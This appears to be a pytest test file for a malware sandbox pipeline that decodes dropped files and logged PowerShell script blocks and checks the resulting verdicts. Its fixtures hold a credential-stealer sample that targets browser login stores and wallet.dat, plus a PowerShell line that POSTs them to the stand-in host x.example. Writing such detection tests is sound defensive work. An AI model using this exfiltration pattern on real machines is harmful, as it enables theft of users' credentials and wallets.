"""Files the sample dropped are brought out and analyzed (never run); PowerShell 4104 script blocks are analyzed
in the form PowerShell itself logged them (after its own decoding)."""
import json
from pathlib import Path

import pipeline
from conftest import bare_job


def _xdl(path: Path, data: bytes):
    key = pipeline.MEMDUMP_KEY
    path.write_bytes(bytes(b ^ key[i % len(key)] for i, b in enumerate(data)))


def test_dropped_files_are_decoded_analyzed_without_vt_and_missing_is_red(tmp_path, monkeypatch):
    job = bare_job(tmp_path)
    job.state["status"] = "done"
    d = job.output_dir / pipeline.DROPPED_DIR
    d.mkdir(parents=True)
    _xdl(d / "00_svc_helper.ps1.xdl", b"$p = 'Login Data'; $q = 'Local State'; $r = 'wallet.dat'; $s = 'logins.json'\n")
    _xdl(d / "01_gone.exe.xdl", b"MZ")
    monkeypatch.setattr(pipeline, "check_signatures", lambda case_dir, paths: ({}, 0))
    looked = []
    monkeypatch.setattr(pipeline.vt_client, "get_api_key", lambda: "k")
    monkeypatch.setattr(pipeline.vt_client, "lookup", lambda sha, key=None: looked.append(sha))
    got = pipeline._collect_xdl(job, job.output_dir, pipeline.DROPPED_DIR, "dropped")
    assert [p.name for p in got] == ["00_svc_helper.ps1", "01_gone.exe"] and not d.exists()
    got[1].unlink()                                           # as if the host antivirus removed it
    pipeline._analyze_extracted(job, got, "bırakılan", "dropped_files", vt_lookup=False)
    assert looked == []                                        # dropped hashes are already looked up elsewhere
    names = {x["name"]: x for x in job.state["dropped_files"]}
    assert names["gone.exe"].get("missing") and len(names["svc_helper.ps1"]["sha256"]) == 64
    assert any(s["rel"] == "[bırakılan] svc_helper.ps1" for s in job.state["static"])
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"Target": "setup.exe"})
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert any("bıraktığı dosya ana bilgisayarda açılırken kayboldu" in x and "gone.exe" in x for x in v["red"])
    assert any("SafeBox_Credential_Stealer_Browser_Targets" in x and "svc_helper.ps1" in x for x in v["red"])
    assert any("bıraktığı 2 dosya dışarı alınıp" in n for n in v["notes"])


def test_scriptblocks_are_analyzed_as_decoded_powershell(tmp_path):
    job = bare_job(tmp_path)
    job.state["status"] = "done"
    blocks = [
        {"Id": "a", "Pid": 4812, "Path": "", "Parts": 2, "Total": 2,
         "Text": "$t = @('Login Data','Local State','wallet.dat','logins.json'); Invoke-WebRequest -Uri https://x.example -Method Post -Body $t"},
        {"Id": "b", "Pid": 4812, "Path": "", "Parts": 1, "Total": 1, "Text": "   "},
        {"Id": "c", "Pid": 4812, "Path": "", "Parts": 1, "Total": 1, "Text": "$global:?"},     # powershell.exe's own
        "not a dict",
    ]
    (job.output_dir / "scriptblocks.json").write_text(json.dumps(blocks), encoding="utf-8")
    pipeline._analyze_scriptblocks(job, job.output_dir)
    assert len(job.state["scriptblocks"]) == 1 and job.state["scriptblocks"][0]["parts"] == 2
    assert any(s["rel"] == "[PowerShell betiği] pid 4812 #1" for s in job.state["static"])
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"Target": "setup.bat"})
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert any("PowerShell betiği" in x and "Credential_Stealer" in x for x in v["red"])
    assert any("1 betik çalıştırdı" in n for n in v["notes"])
    assert "scriptblocks.json" in pipeline.OUTPUT_ALLOWLIST


def test_bad_scriptblocks_file_is_ignored(tmp_path):
    job = bare_job(tmp_path)
    (job.output_dir / "scriptblocks.json").write_text('{"Text": 5}', encoding="utf-8")
    pipeline._analyze_scriptblocks(job, job.output_dir)
    assert job.state.get("scriptblocks") == []
    (job.output_dir / "scriptblocks.json").write_bytes(b"x" * (pipeline._SCRIPTBLOCK_MAX_FILE + 1))
    job.state.pop("scriptblocks")
    pipeline._analyze_scriptblocks(job, job.output_dir)
    assert "scriptblocks" not in job.state


def test_monitor_collects_script_blocks_and_saves_dropped_files():
    ps = (Path(pipeline.__file__).parent / "sandbox" / "Inside-Sandbox.ps1").read_text(encoding="utf-8")
    assert "EnableScriptBlockLogging" in ps and "function Get-SampleScriptBlocks" in ps
    assert "if (-not $TreePids.ContainsKey($epid)) { continue }" in ps        # only the sample's own PowerShell
    assert "function Save-DroppedFiles" in ps and "$_.SigStatus -ne 'Valid'" in ps
    assert "DroppedSaved        = @($droppedSaved)" in ps and "ScriptBlocks    = @($scriptBlocks)" in ps
